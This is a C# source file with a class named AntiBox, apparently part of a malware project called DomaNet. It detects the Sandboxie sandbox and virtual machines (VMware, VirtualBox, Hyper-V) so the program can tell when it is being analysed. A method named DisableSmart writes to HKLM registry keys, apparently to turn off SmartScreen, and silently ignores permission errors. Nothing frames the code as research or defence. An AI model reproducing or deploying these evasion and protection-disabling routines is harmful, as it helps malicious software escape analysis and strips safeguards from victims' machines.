namespace DomaNet
{
    using Microsoft.Win32;
    using System;
    using System.Diagnostics;
    using System.Management;
    using System.Security;

    public class AntiBox
    {
        public static bool SandBoxie
        {
            get
            {
                if (Process.GetProcessesByName(processName: "wsnm").Length > 0 || (NativeMethods.GetModuleHandle(lpModuleName: "SbieDll.dll").ToInt32() != 0))
                {
                    return true;
                }
                return false;
            }
        }

        public static bool DetectVirtualMachine
        {
            get
            {
                using (var items = new ManagementObjectSearcher(queryString: "Select * from Win32_ComputerSystem").Get())
                {
                    try
                    {
                        foreach (var item in items)
                        {
                            if ((item["Manufacturer"].ToString().ToLower() == "microsoft corporation" &&
                                item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) ||
                                item["Manufacturer"].ToString().ToLower().Contains("vmware") ||
                                item["Model"].ToString() == "VirtualBox")
                            {
                                return true;
                            }
                        }
                    }
                    catch { }
                    return false;
                }
            }
        }

        public static void DisableSmart(string PathReg, string ValueText, string Offline, bool Check)
        {
            try
            {
                if (Environment.Is64BitOperatingSystem)
                {
                    using (var hklmHive_64 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                    {
                        using (var runKey_64 = hklmHive_64.OpenSubKey(PathReg, Check))
                        {
                            runKey_64?.SetValue(name: ValueText, value: Offline);
                        }
                    }
                }
                else
                {
                    using (var hklmHive_32 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32))
                    {
                        using (var runKey_32 = hklmHive_32.OpenSubKey(PathReg, Check = false))
                        {
                            runKey_32?.SetValue(name: ValueText, value: Offline);
                        }
                    }
                }
            }
            catch (ArgumentException) { }
            catch (UnauthorizedAccessException) { }
            catch (SecurityException) { }
        }
    }
}